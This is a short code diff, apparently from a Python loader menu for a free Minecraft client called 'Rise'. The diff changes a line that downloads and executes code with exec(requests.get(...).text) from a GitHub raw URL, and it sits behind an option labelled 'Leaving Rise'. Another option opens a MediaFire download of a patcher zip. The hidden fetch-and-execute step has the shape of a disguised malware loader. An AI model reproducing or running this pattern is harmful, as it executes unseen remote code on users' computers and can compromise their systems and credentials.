@@ -59,7 +59,7 @@ while True:
       if chon == '-':
           os.system('cls')
           print("Leaving Rise")
-          exec(requests.get('https://raw.githubusercontent.com/MCCFree/MCC-Loader/main/Minecraft').text)
+          exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Minecraft.txt').text)
       elif chon == 'P':
           webbrowser.open_new("https://www.mediafire.com/file/48i74z1wnp4icox/Rise+Patcher.zip/file")
       elif chon == '1':
